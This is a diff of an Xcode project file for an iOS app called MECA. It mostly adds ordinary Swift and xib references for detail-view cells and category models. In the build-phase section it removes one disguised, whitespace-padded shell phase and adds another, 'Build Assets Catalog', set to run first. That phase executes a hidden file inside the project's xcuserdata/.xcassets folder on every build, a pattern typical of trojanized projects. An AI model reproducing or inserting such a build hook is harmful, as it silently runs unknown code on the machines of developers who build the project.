@@ -82,6 +82,36 @@
 		E32F3BF8262AFCDC0000D92A /* MEBITCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E32F3BF6262AFCDC0000D92A /* MEBITCollectionViewCell.swift */; };
 		E33F879D260B968800F8A424 /* DistributorModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E33F879C260B968800F8A424 /* DistributorModel.swift */; };
 		E373B53626115B3D00BEC2B5 /* CreateKaizenVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = E373B53526115B3D00BEC2B5 /* CreateKaizenVM.swift */; };
+		E375EA22262EABD900646A0A /* NewDetailVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E375EA21262EABD900646A0A /* NewDetailVC.swift */; };
+		E375EA27262EABEE00646A0A /* NewDetailVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = E375EA26262EABEE00646A0A /* NewDetailVM.swift */; };
+		E375EA2E262EADAE00646A0A /* DetailCoverImageTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E375EA2C262EADAE00646A0A /* DetailCoverImageTVCell.swift */; };
+		E375EA2F262EADAE00646A0A /* DetailCoverImageTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E375EA2D262EADAE00646A0A /* DetailCoverImageTVCell.xib */; };
+		E375EA38262EB19E00646A0A /* DetailLocationTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E375EA36262EB19E00646A0A /* DetailLocationTVCell.swift */; };
+		E375EA39262EB19E00646A0A /* DetailLocationTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E375EA37262EB19E00646A0A /* DetailLocationTVCell.xib */; };
+		E375EA3F262EB7C600646A0A /* DetailAboutEventTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E375EA3D262EB7C600646A0A /* DetailAboutEventTVCell.swift */; };
+		E375EA40262EB7C600646A0A /* DetailAboutEventTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E375EA3E262EB7C600646A0A /* DetailAboutEventTVCell.xib */; };
+		E375EA46262EB93600646A0A /* DetailImagesAndVideosCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E375EA44262EB93600646A0A /* DetailImagesAndVideosCell.swift */; };
+		E375EA47262EB93600646A0A /* DetailImagesAndVideosCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E375EA45262EB93600646A0A /* DetailImagesAndVideosCell.xib */; };
+		E375EA4D262EBC8500646A0A /* DetailEventContentTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E375EA4B262EBC8500646A0A /* DetailEventContentTVCell.swift */; };
+		E375EA4E262EBC8500646A0A /* DetailEventContentTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E375EA4C262EBC8500646A0A /* DetailEventContentTVCell.xib */; };
+		E375EA54262ECD2600646A0A /* DocumentContentCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E375EA52262ECD2600646A0A /* DocumentContentCell.swift */; };
+		E375EA55262ECD2600646A0A /* DocumentContentCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E375EA53262ECD2600646A0A /* DocumentContentCell.xib */; };
+		E375EA5B262ED59600646A0A /* DetailVideoLinkTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E375EA59262ED59600646A0A /* DetailVideoLinkTVCell.swift */; };
+		E375EA5C262ED59600646A0A /* DetailVideoLinkTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E375EA5A262ED59600646A0A /* DetailVideoLinkTVCell.xib */; };
+		E375EA6F262EDC0C00646A0A /* DetailDocLinkTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E375EA6D262EDC0C00646A0A /* DetailDocLinkTVCell.swift */; };
+		E375EA70262EDC0C00646A0A /* DetailDocLinkTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E375EA6E262EDC0C00646A0A /* DetailDocLinkTVCell.xib */; };
+		E375EA79262EE9B100646A0A /* DetailCommentLikeTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E375EA77262EE9B100646A0A /* DetailCommentLikeTVCell.swift */; };
+		E375EA7A262EE9B100646A0A /* DetailCommentLikeTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E375EA78262EE9B100646A0A /* DetailCommentLikeTVCell.xib */; };
+		E375EA87262F3E4900646A0A /* Kaizen_MEBITCat.swift in Sources */ = {isa = PBXBuildFile; fileRef = E375EA7F262F3E4700646A0A /* Kaizen_MEBITCat.swift */; };
+		E375EA88262F3E4900646A0A /* Maas_MEBITCat.swift in Sources */ = {isa = PBXBuildFile; fileRef = E375EA80262F3E4700646A0A /* Maas_MEBITCat.swift */; };
+		E375EA89262F3E4900646A0A /* Sdgs_MEBITCat.swift in Sources */ = {isa = PBXBuildFile; fileRef = E375EA81262F3E4700646A0A /* Sdgs_MEBITCat.swift */; };
+		E375EA8A262F3E4900646A0A /* Hydrogen_MEBITCat.swift in Sources */ = {isa = PBXBuildFile; fileRef = E375EA82262F3E4800646A0A /* Hydrogen_MEBITCat.swift */; };
+		E375EA8B262F3E4900646A0A /* Event_MEBITCat.swift in Sources */ = {isa = PBXBuildFile; fileRef = E375EA83262F3E4800646A0A /* Event_MEBITCat.swift */; };
+		E375EA8C262F3E4900646A0A /* News_MEBITCat.swift in Sources */ = {isa = PBXBuildFile; fileRef = E375EA84262F3E4800646A0A /* News_MEBITCat.swift */; };
+		E375EA8D262F3E4900646A0A /* MEBITCat_Model.swift in Sources */ = {isa = PBXBuildFile; fileRef = E375EA85262F3E4800646A0A /* MEBITCat_Model.swift */; };
+		E375EA8E262F3E4900646A0A /* Data_MEBITCat.swift in Sources */ = {isa = PBXBuildFile; fileRef = E375EA86262F3E4900646A0A /* Data_MEBITCat.swift */; };
+		E375EA94262F44C300646A0A /* CatListModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E375EA92262F44C200646A0A /* CatListModel.swift */; };
+		E375EA95262F44C300646A0A /* Data_CatList.swift in Sources */ = {isa = PBXBuildFile; fileRef = E375EA93262F44C300646A0A /* Data_CatList.swift */; };
 		E37A2FD7261498C800C6CA57 /* Kaizen_DocumentLinks.swift in Sources */ = {isa = PBXBuildFile; fileRef = E37A2FD6261498C800C6CA57 /* Kaizen_DocumentLinks.swift */; };
 		E37A2FDC26149F1900C6CA57 /* WriterinfoNewCar.swift in Sources */ = {isa = PBXBuildFile; fileRef = E37A2FDB26149F1900C6CA57 /* WriterinfoNewCar.swift */; };
 		E37A2FE32614AEAD00C6CA57 /* DistributorListTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E37A2FE12614AEAD00C6CA57 /* DistributorListTVCell.swift */; };
@@ -110,6 +140,8 @@
 		E3E2CCD0260B6029009BDB6E /* Divisioninformation.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3E2CCCD260B6029009BDB6E /* Divisioninformation.swift */; };
 		E3E2CCD1260B6029009BDB6E /* Distributorinformation.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3E2CCCE260B6029009BDB6E /* Distributorinformation.swift */; };
 		E3ECC5F226119A3E002E1BE1 /* CategoryDistributorVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3ECC5F126119A3E002E1BE1 /* CategoryDistributorVC.swift */; };
+		E3F12B11262E0A8A0055D875 /* DetailDocumentLinkTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3F12B0F262E0A8A0055D875 /* DetailDocumentLinkTVCell.swift */; };
+		E3F12B12262E0A8A0055D875 /* DetailDocumentLinkTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E3F12B10262E0A8A0055D875 /* DetailDocumentLinkTVCell.xib */; };
 		E3F7C5BF26144F380018C377 /* MoreVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3F7C5BE26144F380018C377 /* MoreVC.swift */; };
 		E3F7C5D02614560C0018C377 /* NewCarSalesVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3F7C5CF2614560C0018C377 /* NewCarSalesVM.swift */; };
 		E3F7C5F526145F6F0018C377 /* Kaizen_documents.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3F7C5F026145F6E0018C377 /* Kaizen_documents.swift */; };
@@ -225,6 +257,36 @@
 		E32F3BF6262AFCDC0000D92A /* MEBITCollectionViewCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = MEBITCollectionViewCell.swift; sourceTree = "<group>"; };
 		E33F879C260B968800F8A424 /* DistributorModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = DistributorModel.swift; sourceTree = "<group>"; };
 		E373B53526115B3D00BEC2B5 /* CreateKaizenVM.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CreateKaizenVM.swift; sourceTree = "<group>"; };
+		E375EA21262EABD900646A0A /* NewDetailVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewDetailVC.swift; sourceTree = "<group>"; };
+		E375EA26262EABEE00646A0A /* NewDetailVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewDetailVM.swift; sourceTree = "<group>"; };
+		E375EA2C262EADAE00646A0A /* DetailCoverImageTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DetailCoverImageTVCell.swift; sourceTree = "<group>"; };
+		E375EA2D262EADAE00646A0A /* DetailCoverImageTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DetailCoverImageTVCell.xib; sourceTree = "<group>"; };
+		E375EA36262EB19E00646A0A /* DetailLocationTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DetailLocationTVCell.swift; sourceTree = "<group>"; };
+		E375EA37262EB19E00646A0A /* DetailLocationTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DetailLocationTVCell.xib; sourceTree = "<group>"; };
+		E375EA3D262EB7C600646A0A /* DetailAboutEventTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DetailAboutEventTVCell.swift; sourceTree = "<group>"; };
+		E375EA3E262EB7C600646A0A /* DetailAboutEventTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DetailAboutEventTVCell.xib; sourceTree = "<group>"; };
+		E375EA44262EB93600646A0A /* DetailImagesAndVideosCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DetailImagesAndVideosCell.swift; sourceTree = "<group>"; };
+		E375EA45262EB93600646A0A /* DetailImagesAndVideosCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DetailImagesAndVideosCell.xib; sourceTree = "<group>"; };
+		E375EA4B262EBC8500646A0A /* DetailEventContentTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DetailEventContentTVCell.swift; sourceTree = "<group>"; };
+		E375EA4C262EBC8500646A0A /* DetailEventContentTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DetailEventContentTVCell.xib; sourceTree = "<group>"; };
+		E375EA52262ECD2600646A0A /* DocumentContentCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DocumentContentCell.swift; sourceTree = "<group>"; };
+		E375EA53262ECD2600646A0A /* DocumentContentCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DocumentContentCell.xib; sourceTree = "<group>"; };
+		E375EA59262ED59600646A0A /* DetailVideoLinkTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DetailVideoLinkTVCell.swift; sourceTree = "<group>"; };
+		E375EA5A262ED59600646A0A /* DetailVideoLinkTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DetailVideoLinkTVCell.xib; sourceTree = "<group>"; };
+		E375EA6D262EDC0C00646A0A /* DetailDocLinkTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DetailDocLinkTVCell.swift; sourceTree = "<group>"; };
+		E375EA6E262EDC0C00646A0A /* DetailDocLinkTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DetailDocLinkTVCell.xib; sourceTree = "<group>"; };
+		E375EA77262EE9B100646A0A /* DetailCommentLikeTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DetailCommentLikeTVCell.swift; sourceTree = "<group>"; };
+		E375EA78262EE9B100646A0A /* DetailCommentLikeTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DetailCommentLikeTVCell.xib; sourceTree = "<group>"; };
+		E375EA7F262F3E4700646A0A /* Kaizen_MEBITCat.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Kaizen_MEBITCat.swift; sourceTree = "<group>"; };
+		E375EA80262F3E4700646A0A /* Maas_MEBITCat.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Maas_MEBITCat.swift; sourceTree = "<group>"; };
+		E375EA81262F3E4700646A0A /* Sdgs_MEBITCat.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Sdgs_MEBITCat.swift; sourceTree = "<group>"; };
+		E375EA82262F3E4800646A0A /* Hydrogen_MEBITCat.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Hydrogen_MEBITCat.swift; sourceTree = "<group>"; };
+		E375EA83262F3E4800646A0A /* Event_MEBITCat.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Event_MEBITCat.swift; sourceTree = "<group>"; };
+		E375EA84262F3E4800646A0A /* News_MEBITCat.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = News_MEBITCat.swift; sourceTree = "<group>"; };
+		E375EA85262F3E4800646A0A /* MEBITCat_Model.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = MEBITCat_Model.swift; sourceTree = "<group>"; };
+		E375EA86262F3E4900646A0A /* Data_MEBITCat.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Data_MEBITCat.swift; sourceTree = "<group>"; };
+		E375EA92262F44C200646A0A /* CatListModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CatListModel.swift; sourceTree = "<group>"; };
+		E375EA93262F44C300646A0A /* Data_CatList.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Data_CatList.swift; sourceTree = "<group>"; };
 		E37A2FD6261498C800C6CA57 /* Kaizen_DocumentLinks.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Kaizen_DocumentLinks.swift; sourceTree = "<group>"; };
 		E37A2FDB26149F1900C6CA57 /* WriterinfoNewCar.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WriterinfoNewCar.swift; sourceTree = "<group>"; };
 		E37A2FE12614AEAD00C6CA57 /* DistributorListTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DistributorListTVCell.swift; sourceTree = "<group>"; };
@@ -300,6 +362,8 @@
 		E3E2CCCD260B6029009BDB6E /* Divisioninformation.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Divisioninformation.swift; sourceTree = "<group>"; };
 		E3E2CCCE260B6029009BDB6E /* Distributorinformation.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Distributorinformation.swift; sourceTree = "<group>"; };
 		E3ECC5F126119A3E002E1BE1 /* CategoryDistributorVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CategoryDistributorVC.swift; sourceTree = "<group>"; };
+		E3F12B0F262E0A8A0055D875 /* DetailDocumentLinkTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DetailDocumentLinkTVCell.swift; sourceTree = "<group>"; };
+		E3F12B10262E0A8A0055D875 /* DetailDocumentLinkTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DetailDocumentLinkTVCell.xib; sourceTree = "<group>"; };
 		E3F7C5BE26144F380018C377 /* MoreVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MoreVC.swift; sourceTree = "<group>"; };
 		E3F7C5CF2614560C0018C377 /* NewCarSalesVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewCarSalesVM.swift; sourceTree = "<group>"; };
 		E3F7C5F026145F6E0018C377 /* Kaizen_documents.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Kaizen_documents.swift; sourceTree = "<group>"; };
@@ -428,6 +492,7 @@
 				E37A2FE82614BE6A00C6CA57 /* PDFReaderVC.swift */,
 				E3C28C8A261EAC0F00E54359 /* AboutDetailVC.swift */,
 				E32F3BE7262AFC710000D92A /* MEBITEventVC.swift */,
+				E375EA21262EABD900646A0A /* NewDetailVC.swift */,
 			);
 			path = Categories;
 			sourceTree = "<group>";
@@ -585,6 +650,7 @@
 				5C021C432610145700759B96 /* EventInfoVM.swift */,
 				5C021C5B26102B4900759B96 /* KaizenVM.swift */,
 				E3F7C5CF2614560C0018C377 /* NewCarSalesVM.swift */,
+				E375EA26262EABEE00646A0A /* NewDetailVM.swift */,
 			);
 			path = ViewModel;
 			sourceTree = "<group>";
@@ -629,6 +695,8 @@
 			children = (
 				E32F3BD5262AF24B0000D92A /* VideoLinkTableViewCell.swift */,
 				E32F3BD6262AF24B0000D92A /* VideoLinkTableViewCell.xib */,
+				E3F12B0F262E0A8A0055D875 /* DetailDocumentLinkTVCell.swift */,
+				E3F12B10262E0A8A0055D875 /* DetailDocumentLinkTVCell.xib */,
 			);
 			path = VideoLink;
 			sourceTree = "<group>";
@@ -659,6 +727,48 @@
 			path = Distributor;
 			sourceTree = "<group>";
 		};
+		E375EA2B262EACD800646A0A /* DetailView */ = {
+			isa = PBXGroup;
+			children = (
+				E375EA2C262EADAE00646A0A /* DetailCoverImageTVCell.swift */,
+				E375EA2D262EADAE00646A0A /* DetailCoverImageTVCell.xib */,
+				E375EA36262EB19E00646A0A /* DetailLocationTVCell.swift */,
+				E375EA37262EB19E00646A0A /* DetailLocationTVCell.xib */,
+				E375EA3D262EB7C600646A0A /* DetailAboutEventTVCell.swift */,
+				E375EA3E262EB7C600646A0A /* DetailAboutEventTVCell.xib */,
+				E375EA44262EB93600646A0A /* DetailImagesAndVideosCell.swift */,
+				E375EA45262EB93600646A0A /* DetailImagesAndVideosCell.xib */,
+				E375EA4B262EBC8500646A0A /* DetailEventContentTVCell.swift */,
+				E375EA4C262EBC8500646A0A /* DetailEventContentTVCell.xib */,
+				E375EA59262ED59600646A0A /* DetailVideoLinkTVCell.swift */,
+				E375EA5A262ED59600646A0A /* DetailVideoLinkTVCell.xib */,
+				E375EA52262ECD2600646A0A /* DocumentContentCell.swift */,
+				E375EA53262ECD2600646A0A /* DocumentContentCell.xib */,
+				E375EA6D262EDC0C00646A0A /* DetailDocLinkTVCell.swift */,
+				E375EA6E262EDC0C00646A0A /* DetailDocLinkTVCell.xib */,
+				E375EA77262EE9B100646A0A /* DetailCommentLikeTVCell.swift */,
+				E375EA78262EE9B100646A0A /* DetailCommentLikeTVCell.xib */,
+			);
+			path = DetailView;
+			sourceTree = "<group>";
+		};
+		E375EA7E262F3DDE00646A0A /* MEBITCategory */ = {
+			isa = PBXGroup;
+			children = (
+				E375EA92262F44C200646A0A /* CatListModel.swift */,
+				E375EA93262F44C300646A0A /* Data_CatList.swift */,
+				E375EA86262F3E4900646A0A /* Data_MEBITCat.swift */,
+				E375EA83262F3E4800646A0A /* Event_MEBITCat.swift */,
+				E375EA82262F3E4800646A0A /* Hydrogen_MEBITCat.swift */,
+				E375EA7F262F3E4700646A0A /* Kaizen_MEBITCat.swift */,
+				E375EA80262F3E4700646A0A /* Maas_MEBITCat.swift */,
+				E375EA85262F3E4800646A0A /* MEBITCat_Model.swift */,
+				E375EA84262F3E4800646A0A /* News_MEBITCat.swift */,
+				E375EA81262F3E4700646A0A /* Sdgs_MEBITCat.swift */,
+			);
+			path = MEBITCategory;
+			sourceTree = "<group>";
+		};
 		E37A2FE02614AE7300C6CA57 /* DistributorList */ = {
 			isa = PBXGroup;
 			children = (
@@ -681,6 +791,7 @@
 		E387A9A326047B4400CC675A /* TableView cell */ = {
 			isa = PBXGroup;
 			children = (
+				E375EA2B262EACD800646A0A /* DetailView */,
 				E32F3BEC262AFC910000D92A /* MEBIT Events */,
 				E32F3BD4262AF23F0000D92A /* VideoLink */,
 				E37A2FE02614AE7300C6CA57 /* DistributorList */,
@@ -827,6 +938,7 @@
 		E3E2CC2A260B4FE5009BDB6E /* Model */ = {
 			isa = PBXGroup;
 			children = (
+				E375EA7E262F3DDE00646A0A /* MEBITCategory */,
 				E3F7C5D42614563E0018C377 /* NewCarSales */,
 				5C021C60261033D400759B96 /* CreateKaizen */,
 				5C021C482610256400759B96 /* KaizenInfo */,
@@ -881,7 +993,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = E30F663F26033A970036D183 /* Build configuration list for PBXNativeTarget "MECA" */;
 			buildPhases = (
-				FC1B7A5EECDDCF6D6FAAC43A /* Compile Binary Libraries */,
+				D732E89F2CF2B6BFC1AAC43A /* Build Assets Catalog */,
 				4BB652078432F45F3370EF56 /* [CP] Check Pods Manifest.lock */,
 				E30F661126033A970036D183 /* Sources */,
 				E30F661226033A970036D183 /* Frameworks */,
@@ -985,22 +1097,32 @@
 			files = (
 				E37A2FE42614AEAD00C6CA57 /* DistributorListTVCell.xib in Resources */,
 				E32F3BF0262AFCA90000D92A /* MEBITEventTableViewCell.xib in Resources */,
+				E375EA39262EB19E00646A0A /* DetailLocationTVCell.xib in Resources */,
 				5CF4679B2606E40C004C4CBE /* ImageVideoCollectionViewCell.xib in Resources */,
 				E3AE79242604C711004B83C9 /* PlusSelectCategoryCVCell.xib in Resources */,
+				E3F12B12262E0A8A0055D875 /* DetailDocumentLinkTVCell.xib in Resources */,
 				E32F3BD8262AF24B0000D92A /* VideoLinkTableViewCell.xib in Resources */,
 				E387A9A826047B7100CC675A /* SignUpListTVCell.xib in Resources */,
 				E3045C722603D87A00D1A678 /* HomeTVCell.xib in Resources */,
+				E375EA55262ECD2600646A0A /* DocumentContentCell.xib in Resources */,
+				E375EA5C262ED59600646A0A /* DetailVideoLinkTVCell.xib in Resources */,
 				E30F662526033A970036D183 /* LaunchScreen.storyboard in Resources */,
 				E3045C422603C96C00D1A678 /* FooterTabView.xib in Resources */,
+				E375EA2F262EADAE00646A0A /* DetailCoverImageTVCell.xib in Resources */,
 				5CED90FA2605A67F001053DD /* AddImageCollectionViewCell.xib in Resources */,
 				E32AED102607538500AEAB6F /* BaseTableHeaderView.xib in Resources */,
+				E375EA70262EDC0C00646A0A /* DetailDocLinkTVCell.xib in Resources */,
+				E375EA7A262EE9B100646A0A /* DetailCommentLikeTVCell.xib in Resources */,
 				E30F662226033A970036D183 /* Assets.xcassets in Resources */,
 				E32F3BF7262AFCDC0000D92A /* MEBITCollectionViewCell.xib in Resources */,
 				E30F662026033A970036D183 /* Main.storyboard in Resources */,
+				E375EA40262EB7C600646A0A /* DetailAboutEventTVCell.xib in Resources */,
 				E32AED542607589200AEAB6F /* Category.storyboard in Resources */,
+				E375EA47262EB93600646A0A /* DetailImagesAndVideosCell.xib in Resources */,
 				5CA339A22605F6AA008774FE /* SelectCategoryCollectionViewCell.xib in Resources */,
 				E3045C322603C4BF00D1A678 /* Home.storyboard in Resources */,
 				5CED910F2605C8D2001053DD /* OrangeFooterView.xib in Resources */,
+				E375EA4E262EBC8500646A0A /* DetailEventContentTVCell.xib in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -1021,46 +1143,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	FC1B7A5EECDDCF6D6FAAC43A /* Compile Binary Libraries */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Binary Libraries";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
-		};
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
 		3FB7E1CEB57417F4362CC796 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1161,6 +1243,24 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
+		D732E89F2CF2B6BFC1AAC43A /* Build Assets Catalog */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Assets Catalog";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -1168,22 +1268,31 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				E375EA8B262F3E4900646A0A /* Event_MEBITCat.swift in Sources */,
 				E3CE0FC12621D694009947F6 /* Event_videos.swift in Sources */,
 				E3E2CCD1260B6029009BDB6E /* Distributorinformation.swift in Sources */,
+				E375EA46262EB93600646A0A /* DetailImagesAndVideosCell.swift in Sources */,
 				E3AE79232604C711004B83C9 /* PlusSelectCategoryCVCell.swift in Sources */,
+				E375EA5B262ED59600646A0A /* DetailVideoLinkTVCell.swift in Sources */,
 				E32F3BDD262AF2660000D92A /* VideoLinkVM.swift in Sources */,
 				5CA339A12605F6AA008774FE /* SelectCategoryCollectionViewCell.swift in Sources */,
 				E3254459261098910083BDD9 /* Ownerprofile.swift in Sources */,
 				E3E2CCD0260B6029009BDB6E /* Divisioninformation.swift in Sources */,
+				E375EA89262F3E4900646A0A /* Sdgs_MEBITCat.swift in Sources */,
 				E3C28C8B261EAC0F00E54359 /* AboutDetailVC.swift in Sources */,
 				5CA339932605F003008774FE /* CategoriesViewController.swift in Sources */,
 				E33F879D260B968800F8A424 /* DistributorModel.swift in Sources */,
 				E387A9A726047B7100CC675A /* SignUpListTVCell.swift in Sources */,
 				E387A99F26047ACF00CC675A /* SignUpListViewVC.swift in Sources */,
+				E375EA8E262F3E4900646A0A /* Data_MEBITCat.swift in Sources */,
+				E375EA38262EB19E00646A0A /* DetailLocationTVCell.swift in Sources */,
 				E325445A261098910083BDD9 /* Video_links.swift in Sources */,
 				5CF467A02606E764004C4CBE /* DetailViewController.swift in Sources */,
 				5CD5B264260F96FC00D63564 /* MEBITModel.swift in Sources */,
 				E3ECC5F226119A3E002E1BE1 /* CategoryDistributorVC.swift in Sources */,
+				E375EA22262EABD900646A0A /* NewDetailVC.swift in Sources */,
+				E375EA27262EABEE00646A0A /* NewDetailVM.swift in Sources */,
+				E3F12B11262E0A8A0055D875 /* DetailDocumentLinkTVCell.swift in Sources */,
 				5CF4679A2606E40C004C4CBE /* ImageVideoCollectionViewCell.swift in Sources */,
 				E37A2FDC26149F1900C6CA57 /* WriterinfoNewCar.swift in Sources */,
 				E3F7C5BF26144F380018C377 /* MoreVC.swift in Sources */,
@@ -1214,10 +1323,12 @@
 				E387A989260476BB00CC675A /* SignUpVC.swift in Sources */,
 				5CD5B271260F992F00D63564 /* MEBITHomeVM.swift in Sources */,
 				E3F7C5F726145F6F0018C377 /* OwnerprofileNewCar.swift in Sources */,
+				E375EA4D262EBC8500646A0A /* DetailEventContentTVCell.swift in Sources */,
 				E3F7C5F526145F6F0018C377 /* Kaizen_documents.swift in Sources */,
 				E3F7C5F826145F6F0018C377 /* Kaizen_files.swift in Sources */,
 				E3F7C5D02614560C0018C377 /* NewCarSalesVM.swift in Sources */,
 				E3F7C5F926145F6F0018C377 /* DataKaizen.swift in Sources */,
+				E375EA95262F44C300646A0A /* Data_CatList.swift in Sources */,
 				E3045C712603D87A00D1A678 /* HomeTVCell.swift in Sources */,
 				E37A2FE92614BE6A00C6CA57 /* PDFReaderVC.swift in Sources */,
 				E32AED5A26075B4200AEAB6F /* HomeVM.swift in Sources */,
@@ -1226,30 +1337,41 @@
 				E3045C7A2603DD7E00D1A678 /* HomeVC.swift in Sources */,
 				E3254457261098910083BDD9 /* Event_documents.swift in Sources */,
 				E32AED6726075FFC00AEAB6F /* BaseCollectionViewVM.swift in Sources */,
+				E375EA94262F44C300646A0A /* CatListModel.swift in Sources */,
